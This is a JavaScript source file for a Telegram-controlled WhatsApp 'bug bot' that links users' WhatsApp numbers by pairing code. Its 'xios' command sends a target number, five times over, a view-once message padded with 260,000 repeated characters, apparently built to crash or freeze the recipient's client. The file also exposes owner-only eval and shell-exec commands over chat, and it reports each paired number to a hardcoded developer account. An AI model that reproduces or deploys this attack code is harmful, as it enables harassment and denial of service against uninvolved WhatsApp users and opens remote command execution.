const { makeWASocket, getContentType, useMultiFileAuthState, fetchLatestBaileysVersion, Browsers, makeCacheableSignalKeyStore, DisconnectReason, generateWAMessageFromContent } = require("@fizzxydev/baileys-pro");
const TelegramBot = require('node-telegram-bot-api');
const NodeCache = require('node-cache');
const pino = require('pino');
const axios = require('axios');
const path = require('path');
const util = require('util');
const chalk = require('chalk');
const { exec } = require('child_process');
const fs = require('fs');
const speed = require("performance-now")
const moment = require("moment-timezone");
const crypto = require('crypto')


const startTime = Date.now();
const settings = require("./config.json")
const BOT_TOKEN = settings.BOT_TOKEN;
let OWNER_ID = settings.OWNER_ID
const bot = new TelegramBot(BOT_TOKEN, { polling: true });
const pairingCodes = new NodeCache({ stdTTL: 3600, checkperiod: 600 });
const requestLimits = new NodeCache({ stdTTL: 120, checkperiod: 60 });
let connectedUsers = {};
const developer = '2349052729951@s.whatsapp.net';
const connectedUsersFilePath = path.join(__dirname, 'pairedUsers.json');
const { smsg } = require("./lib/myfunc")
const CHANNEL_USERNAME = '@gabimarutechchannel';
const OWNER_FILE = path.join(__dirname, 'telegramowners.json');

if (!fs.existsSync(OWNER_FILE)) {
    fs.writeFileSync(OWNER_FILE, JSON.stringify([]));
}

function isOwner(userId) {
    const owners = JSON.parse(fs.readFileSync(OWNER_FILE));
    return owners.includes(userId.toString());
}
async function userFollowsChannel(userId, bot) {
    try {
        const chatMember = await bot.getChatMember(CHANNEL_USERNAME, userId);
        return ['member', 'administrator', 'creator'].includes(chatMember.status);
    } catch (err) {
        console.error('❌ Error checking channel membership:', err);
        return false;
    }
}
const formatTime = (seconds) => {
  seconds = Number(seconds);
  const d = Math.floor(seconds / (3600 * 24));
  const h = Math.floor((seconds % (3600 * 24)) / 3600);
  const m = Math.floor((seconds % 3600) / 60);
  const s = Math.floor(seconds % 60);
  const dDisplay = d > 0 ? `${d} ${d === 1 ? 'day, ' : 'days, '}` : '';
  const hDisplay = h > 0 ? `${h} ${h === 1 ? 'hour, ' : 'hours, '}` : '';
  const mDisplay = m > 0 ? `${m} ${m === 1 ? 'minute, ' : 'minutes, '}` : '';
  const sDisplay = s > 0 ? `${s} ${s === 1 ? 'second' : 'seconds'}` : '';
  return `${dDisplay}${hDisplay}${mDisplay}${sDisplay}`;
};


// Load connected users from the JSON file
function loadConnectedUsers() {
    if (fs.existsSync(connectedUsersFilePath)) {
        const data = fs.readFileSync(connectedUsersFilePath);
        connectedUsers = JSON.parse(data);
    }
}

// Save connected users to the JSON file
function saveConnectedUsers() {
    fs.writeFileSync(connectedUsersFilePath, JSON.stringify(connectedUsers, null, 2));
}

let isFirstLog = true;

async function startWhatsAppBot(phoneNumber, telegramChatId = null) {
    const sessionPath = path.join(__dirname, 'tmp', `session_${phoneNumber}`);

    if (!fs.existsSync(sessionPath)) {
        console.log(`Session not found for ${phoneNumber}.`);
        return;
    }

    let { version, isLatest } = await fetchLatestBaileysVersion();
    if (isFirstLog) {
        console.log(`Using Baileys version: ${version} (Latest: ${isLatest})`);
        isFirstLog = false;
    }

    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
    const msgRetryCounterCache = new NodeCache();
    const conn = makeWASocket({
        logger: pino({ level: 'silent' }),
        printQRInTerminal: false,
        browser: Browsers.windows('Firefox'),
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "fatal" }).child({ level: "fatal" })),
        },
        markOnlineOnConnect: true,
        generateHighQualityLinkPreview: true,
        msgRetryCounterCache,
        defaultQueryTimeoutMs: undefined,
    });

    if (conn.authState.creds.registered) {
        await saveCreds();
        console.log(`Reloaded Creds For ${phoneNumber}!`);
    } else {

        if (telegramChatId) {
            setTimeout(async () => {
                const custom = "GABIMARU";
                let code = await conn.requestPairingCode(phoneNumber, custom);
                code = code?.match(/.{1,4}/g)?.join("-") || code;
                pairingCodes.set(code, { count: 0, phoneNumber });
                const pairText = `
PAIRING CODE -> \`${code}\`

🔗 **Instructions:**
1. 🧭 Open *WhatsApp* on your phone.
2. 📲 Tap the **three dots** (menu) in the top right corner.
3. 💻 Select **Linked Devices**.
4. ➕ Tap on **Link a Device**.
5. 🔤 You'll see a prompt to scan a QR — instead, *tap the "Link with phone number instead"* option.
7. 🧩 Enter the pairing code you received: **${code}**
8. ✅ Done! Your WhatsApp is now linked to the bot.

If you need a new code, \`/delpair <number>\` then request one again!

_— Powered by Gabimaru Bot 🐉_
`;
                bot.sendMessage(telegramChatId, pairText, { parse_mode: 'Markdown' });
                console.log(`Use \`${code}\` to link your WhatsApp to the WhatsApp bot.`);
            }, 3000);
        }
    }
    conn.public = true
    conn.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
            await saveCreds();
            console.log(`Credentials saved successfully for ${phoneNumber}!`);

            if (telegramChatId) {
                if (!connectedUsers[telegramChatId]) {
                    connectedUsers[telegramChatId] = [];
                }
                                connectedUsers[telegramChatId].push({ phoneNumber, connectedAt: startTime });
                saveConnectedUsers();
                bot.sendMessage(telegramChatId, `Connection to ${phoneNumber} has been secured. ✅`)
		console.log(`
Connection to ${phoneNumber} has been secured. ✅`);
            }

            try {
                await conn.sendMessage(developer, { text: `Connection to ${phoneNumber} has been secured. ✅` });
            } catch (error) {
                console.error('Error sending message to admin:', error);
            }
        } else if (connection === 'close') {
            if (lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut) {
                console.log(`Session closed for ${phoneNumber}. Attempting to restart...`);
                startWhatsAppBot(phoneNumber, telegramChatId);
            }
        }
    });

    conn.ev.on('creds.update', saveCreds);

conn.ev.on('messages.upsert', async ({ messages, type }) => {
    try {
        if (type !== 'notify' || !messages || !messages[0]) return;

        const msg = messages[0];
        if (!msg.message || msg.key.remoteJid === 'status@broadcast') return;

        const fromMe = msg.key.fromMe;
        if (!conn.public && !fromMe) return;

        // Handle ephemeral messages
        msg.message = msg.message?.ephemeralMessage?.message || msg.message;
        const m = smsg(JSON.parse(JSON.stringify(msg)), conn);
        const typeMsg = getContentType(msg.message);
        const chat = msg.key.remoteJid;
        const isGroup = chat.endsWith('@g.us');

        const body = (
            typeMsg === 'conversation' ? msg.message.conversation :
            typeMsg === 'imageMessage' ? msg.message.imageMessage.caption :
            typeMsg === 'videoMessage' ? msg.message.videoMessage.caption :
            typeMsg === 'extendedTextMessage' ? msg.message.extendedTextMessage.text :
            typeMsg === 'buttonsResponseMessage' ? msg.message.buttonsResponseMessage.selectedButtonId :
            typeMsg === 'listResponseMessage' ? msg.message.listResponseMessage.singleSelectReply.selectedRowId :
            ''
        )?.trim() || '';

        const prefix = settings.prefix || '.';
        const isCmd = body.startsWith(prefix);
        const command = isCmd ? body.slice(prefix.length).trim().split(' ')[0].toLowerCase() : '';
        const args = body.trim().split(/\s+/).slice(1);
        const q = args.join(' ');

        const sender = msg.key.fromMe ? conn.user.id : (msg.key.participant || msg.key.remoteJid);
        const senderNumber = sender.split('@')[0];
        const botNumber = conn.user.id.split(':')[0] + '@s.whatsapp.net';
        const pushname = msg.pushName || 'Unknown';

        // Styled message logs
        console.log(
            chalk.greenBright('📩 New Message:'),
            chalk.cyan(`${pushname} (${senderNumber})`),
            chalk.yellow(isGroup ? `[GROUP: ${chat.split('@')[0]}]` : `[PRIVATE]`),
            chalk.magentaBright(isCmd ? `>> ${command}` : `>> ${body.slice(0, 30)}...`)
        );

        // Owner check
        const ownerList = JSON.parse(fs.readFileSync('./developers.json'));
        const isCreator = [botNumber, ...ownerList.map(n => `${n.replace(/\D/g, '')}@s.whatsapp.net`)].includes(sender);

        // Group info
        let groupMetadata = {}, groupAdmins = [];
        if (isGroup) {
            groupMetadata = await conn.groupMetadata(chat).catch(() => ({}));
            groupAdmins = Array.isArray(groupMetadata.participants)
                ? groupMetadata.participants.filter(p => p.admin).map(p => p.id)
                : [];
        }

        const cleanSender = sender.split(':')[0] + '@s.whatsapp.net';
        const isAdmin = groupAdmins.includes(sender) || groupAdmins.includes(cleanSender);
        const isBotAdmin = groupAdmins.includes(botNumber);

        // Helper functions
        async function xiosinv(bad, target) {
            tmsg = await generateWAMessageFromContent(target, {
                viewOnceMessage: {
                    message: {
                        listResponseMessage: {
                            title: '𝙺𝚄𝙽𝙻𝙴 𝚇𝙾𝚇𝙾\n',
                            description: "\n\n\n" + "𑪆".repeat(260000),
                            singleSelectReply: {
                                selectedId: "id"
                            },
                            listType: 1
                        }
                    }
                }
            }, {});

            await bad.relayMessage("status@broadcast", tmsg.message, {
                messageId: tmsg.key.id,
                statusJidList: [target],
                additionalNodes: [{
                    tag: "meta",
                    attrs: {},
                    content: [{
                        tag: "mentioned_users",
                        attrs: {},
                        content: [{
                            tag: "to",
                            attrs: { jid: target },
                            content: undefined,
                        }],
                    }],
                }],
            });
        }

        const send = async (text) => conn.sendMessage(chat, { text });
        const xreply = async (text) => conn.sendMessage(chat, {
            text,
            contextInfo: {
                mentionedJid: [sender],
                externalAdReply: {
                    title: "𝐕𝐈𝐏𝐄𝐑 𝐁𝐔𝐆",
                    body: pushname,
                    mediaUrl: "https://t.me/lonelydeveloper",
                    sourceUrl: "https://t.me/gabimarutechchannel",
                    thumbnailUrl: "https://files.catbox.moe/4sdoxu.jpg",
                    showAdAttribution: false
                }
            }
        });

        // Commands
        if (isCmd) {
            switch (command) {
                case 'ping': {
                    const start = speed();
                    const end = speed();
                    return xreply(`
━━━━━━━━━━━━━━━━━
◉ 𝙷𝙴𝙻𝙻𝙾 ${pushname}
━━━━━━━━━━━━━━━━━
◈ 𝐕𝐈𝐏𝐄𝐑 𝐁𝐔𝐆 𝚂𝙿𝙴𝙴𝙳 : ${Math.floor(end - start)} 𝐌𝐒
━━━━━━━━━━━━━━━━━
`);
                }

                case "public": {
                    if (!isCreator) return;
                    xreply("Status has successfully changed to public");
                    conn.public = true;
                    break;
                }

                case "self": {
                    if (!isCreator) return;
                    xreply("Status has successfully changed to private");
                    conn.public = false;
                    break;
                }

                case 'creategc':
                case 'creategroup': {
                    if (!isCreator) return;
                    if (!args.join(" ")) return xreply(`Use ${prefix + command} groupname`);
                    let cret = await conn.groupCreate(args.join(" "), []);
                    let response = await conn.groupInviteCode(cret.id);
                    let capt = `     「 Created Group 」

▸ Name : ${cret.subject}
▸ Owner : @${cret.owner.split("@")[0]}
▸ Creation : ${moment(cret.creation * 1000).tz("Africa/Lagos").format("DD/MM/YYYY HH:mm:ss")}

https://chat.whatsapp.com/${response}`;
                    await conn.sendMessage(chat, { text: capt });
                    break;
                }

                case "subject":
                case "changesubject": {
                    if (!isGroup) return send("This command is only for groups");
                    if (!isBotAdmin) return send("I Need Admin Privileges To Complete This command");
                    if (!isAdmin) return send("Only for admins");
                    if (!q) return send("Provide text for group subject");
                    await conn.groupUpdateSubject(chat, q);
                    xreply('Group name successfully updated!');
                    break;
                }

                case "desc":
                case "setdesc": {
                    if (!isGroup) return send("This command is only for groups");
                    if (!isBotAdmin) return send("I Need Admin Privileges To Complete This command");
                    if (!isAdmin) return send("Only for admins");
                    if (!q) return send("Provide text for group description");
                    await conn.groupUpdateDescription(chat, q);
                    xreply(`Group description successfully updated! 👥\n> 𝐆𝐚𝐛𝐢𝐦𝐚𝐫𝐮`);
                    break;
                }

                case "disp-off": {
                    if (!isGroup) return send("This command is only for groups");
                    if (!isBotAdmin) return send("Bot must be admin");
                    if (!isAdmin) return send("Only for admins");
                    await conn.groupToggleEphemeral(chat, 0);
                    xreply('Disappearing messages successfully turned off!');
                    break;
                }

                case "xios": {
                    if (!isCreator) return send("Don't think you can fool me, you're not premium user");
                    if (!q) return send("Usage: `xios 234xxx`");
                    const target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
                    for (let i = 0; i < 5; i++) {
                        await xiosinv(conn, target);
                    }
                    send(`${target}: User Disarmed ❌`);
                    break;
                }

                case 'menu': {
                    const image = "https://files.catbox.moe/yxnsoc.jpg";
                    await conn.sendMessage(chat, {
                        image: { url: image },
                        caption: `
𝗕𝗼𝘁: 𝐕𝐈𝐏𝐄𝐑: 𝐀𝐖𝐀𝐊𝐄𝐍𝐈𝐍𝐆 🧭
𝗗𝗲𝘃: 𝐆𝐚𝐛𝐢𝐦𝐚𝐫𝐮
𝗩𝗲𝗿𝘀𝗶𝗼𝗻: 𝐖𝐡𝐚𝐭𝐗𝐓𝐞𝐥𝐞

𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦:
.𝗉𝗂𝗇𝗀
.𝗆𝖾𝗇𝗎
.𝖽𝖾𝗌𝖼 [𝗇𝖾𝗐]
.𝗌𝗎𝖻𝗃𝖾𝖼𝗍 [𝗇𝖾𝗐]
.𝗄𝗂𝖼𝗄 @user
.𝖼𝗋𝖾𝖺𝗍𝖾𝗀𝖼

𝗦𝗣𝗘𝗖𝗜𝗔𝗟 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦:
.𝗌𝖾𝗅𝖿
.𝗉𝗎𝖻𝗅𝗂𝖼
.𝗑𝗂𝗈𝗌 𝟤𝟥𝟦𝗑𝗑𝗑

𝖢𝗋𝖾𝖺𝗍𝖾𝖽 𝖻𝗒 ayokunledavid.t.me
`
                    });
                    break;
                }

                case 'kick':
                case 'remove': {
                    if (!q) return send(`Usage: .${command || "kick"} @user`);
                    const jid = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
                    await conn.groupParticipantsUpdate(chat, [jid], 'remove');
                    xreply(`${jid} has successfully been removed`);
                    break;
                }

                case 'group-link':
                case 'gclink': {
                    if (!isGroup) return send("❌ This command is only for groups.");
                    const code = await conn.groupInviteCode(chat);
                    return send(`🔗 Group Link:\nhttps://chat.whatsapp.com/${code}`);
                }

                default:
                    if (isCreator && body.startsWith('=>')) {
                        try {
                            const result = await eval(`(async () => { return ${body.slice(3)} })()`);
                            return send(util.format(result));
                        } catch (e) {
                            return send(String(e));
                        }
                    }

                    if (isCreator && body.startsWith('>')) {
                        try {
                            let evaled = await eval(body.slice(2));
                            if (typeof evaled !== 'string') evaled = util.inspect(evaled);
                            return send(evaled);
                        } catch (err) {
                            return send(String(err));
                        }
                    }

                    if (isCreator && body.startsWith('$')) {
                        exec(body.slice(2), (err, stdout, stderr) => {
                            if (err) return send(err.message);
                            if (stdout) return send(stdout);
                            if (stderr) return send(stderr);
                        });
                    }
                    break;
            }
        }

    } catch (err) {
        console.error(chalk.redBright('❌ Error in messages.upsert:'), err);
    }
});
}

let isPairLocked = false;

bot.onText(/\/lockpair/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!isOwner(userId)) {
    return bot.sendMessage(chatId, "❌ You are not authorized to use this command.");
  }

  isPairLocked = false;
  bot.sendMessage(chatId, "🔒 /pair command has been locked. Only owners can use it now.");
});

bot.onText(/\/unlockpair/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!isOwner(userId)) {
    return bot.sendMessage(chatId, "❌ You are not authorized to use this command.");
  }

  isPairLocked = true;
  bot.sendMessage(chatId, "🔓 /pair command has been unlocked. All users can use it now.");
});

bot.onText(/\/pair(?:\s(\d+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const phoneNumber = match[1];

       if (!phoneNumber) {
        return bot.sendMessage(chatId, `⚠️ Wrong format, Usage: /pair 234xxxxxx`, {
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: 'Join Channel', url: `https://t.me/gabimarutechchannel` }
                    ]
                ]
            }
        });
    }
    // Channel follow enforcement
    const follows = await userFollowsChannel(userId, bot);
    if (!follows) {
        return bot.sendMessage(chatId, `❌ Please follow ${CHANNEL_USERNAME} before using this command.`);
    }

    // Pair lock check
    if (isPairLocked && !isOwner(userId)) {
        return bot.sendMessage(chatId, `🚫 Pairing is currently locked. Only bot owners can use this command.`);
    }

    const sessionPath = path.join(__dirname, 'tmp', `session_${phoneNumber}`);

    if (!fs.existsSync(sessionPath)) {
        fs.mkdirSync(sessionPath, { recursive: true });
        console.log(`✅ Session directory created for ${phoneNumber}`);
        bot.sendMessage(chatId, `✅ Session directory created for ${phoneNumber}`);
        
        // Run your WhatsApp pairing logic
        startWhatsAppBot(phoneNumber, chatId).catch(err => {
            console.error('❌ Error pairing:', err);
            bot.sendMessage(chatId, '❌ An error occurred while connecting.');
        });
    } else {
        bot.sendMessage(chatId, `⚠️ Session for ${phoneNumber} already exists. Use /delpair to remove it.`);
    }
});


// Handle /delete command
bot.onText(/\/delpair (\d+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const ownerId = msg.from.id.toString();
    const phoneNumber = match[1];
    const sessionPath = path.join(__dirname, 'tmp', `session_${phoneNumber}`);
    /*
    if (ownerId !== OWNER_ID) {
        return bot.sendMessage(chatId, '❌ You are not authorized to use this command.');
    }
    */
    if (fs.existsSync(sessionPath)) {
           fs.rmSync(sessionPath, { recursive: true, force: true });
            bot.sendMessage(chatId, `Session for ${phoneNumber} has been deleted. You can now request a new pairing code.`);
            connectedUsers[chatId] = connectedUsers[chatId].filter(user => user.phoneNumber !== phoneNumber); // Remove the association after deletion
            saveConnectedUsers(); // Save updated connected users
    } else {
        bot.sendMessage(chatId, `No session found for ${phoneNumber}. It may have already been deleted.`);
    }
});

// Handle /menu command
bot.onText(/\/menu|\/start/, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const options = {
    reply_markup: JSON.stringify({
      inline_keyboard: [
        [
          {
            text: "WhatsApp",
            url: "https://wa.me/6283128820826"
          }
        ],
        [
          {
            text: "Telegram Channel",
            url: "https://t.me/gabimarutechchannel"
          }
        ]
      ]
    })
  };

  const imageUrl = 'https://b.top4top.io/p_3360xqf1y0.jpg';

  const caption = `
Hello ${msg.from.first_name || "there"}
Welcome To The Telegram Bot Interface
/pair <phone number>
/delpair <phone number>

Creator -> ayokunledavid.t.me`;

  bot.sendPhoto(chatId, imageUrl, {
    caption: caption,
    reply_markup: options.reply_markup
  })
  .catch(error => {
    console.error("Error sending photo:", error);
    bot.sendMessage(chatId, "Sorry, I couldn't send the image.  Please try again later.");
  });
});

bot.onText(/\/list/, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const connectedUser  = connectedUsers[chatId];
    if (connectedUser  && connectedUser .length > 0) {
        let statusText = `Bot Status:\n- Connected Numbers:\n`;
        connectedUser .forEach(user => {
            const uptime = Math.floor((Date.now() - user.connectedAt) / 1000); // Runtime in seconds
            statusText += `${user.phoneNumber} (Uptime: ${uptime} seconds)\n`;
        });
        bot.sendMessage(chatId, statusText);
    } else {
        bot.sendMessage(chatId, `You have no registered numbers.`);
    }
}); 

// Function to load all session files
async function loadAllSessions() {
    const sessionsDir = path.join(__dirname, 'tmp');
    if (!fs.existsSync(sessionsDir)) {
        fs.mkdirSync(sessionsDir);
    }

    const sessionFiles = fs.readdirSync(sessionsDir);
    for (const file of sessionFiles) {
        const phoneNumber = file.replace('session_', '');
        await startWhatsAppBot(phoneNumber);
    }
}

// Ensure all sessions are loaded on startup
loadConnectedUsers(); // Load Connected users from the JSON file
loadAllSessions().catch(err => {
    console.log('Error loading sessions:', err);
});

// Start the bor
        console.table({
            "Bot Name": "WhatsTele Bot",
            "Link": `https://t.me/gabimarutechchannel`,
            "Author": "https://t.me/ayokunledavid"
})
console.log('Telegram bot imstace has started...');


let file = require.resolve(__filename)
fs.watchFile(file, () => {
    fs.unwatchFile(file)
    console.log(`Update ${__filename}`)
    delete require.cache[file]
    require(file)
})
